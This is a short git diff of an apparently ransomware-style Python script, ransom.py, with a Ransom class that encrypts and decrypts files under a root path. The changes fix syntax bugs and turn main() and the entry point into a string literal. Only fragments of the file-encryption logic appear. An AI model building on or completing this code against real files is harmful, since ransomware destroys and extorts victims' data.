@@ -6,7 +6,7 @@ import argparse
 import socket
 import uuid
 from uuid import getnode as get_mac
-import KeyManager
+from KeyManager import KeyManager
 
 
 class Ransom:
@@ -26,7 +26,7 @@ class Ransom:
         
         self.keyManager = KeyManager()
     
-    def getDefaultRoot():
+    def getDefaultRoot(self):
         path = os.path.realpath('ransom.py')
         parts = path.split('/')
         path = '/'.join(parts[:-1])
@@ -52,7 +52,7 @@ class Ransom:
             f.truncate()
 
     def startDecryption(self):
-        if self.key = '':
+        if self.key == '':
             raise ValueError('The key is empty. Cannot decrypt without a key')
             print('No key') ### TODO díla við þetta
             return 
@@ -75,7 +75,7 @@ class Ransom:
             f.write(decryptedContent)
             f.truncate()
     
-
+"""
 def main():
     ransom = Ransom()
     path = os.path.realpath('ransom.py')
@@ -88,6 +88,7 @@ def main():
     #print(path)
     ransom = Ransom(root = path)
     ransom.encrypt()
+ 
 
 
 
@@ -126,7 +127,7 @@ else: #Encrypt is default
 #if __name__ == '__main__':
     #main()
 
-
+"""
         
 
     
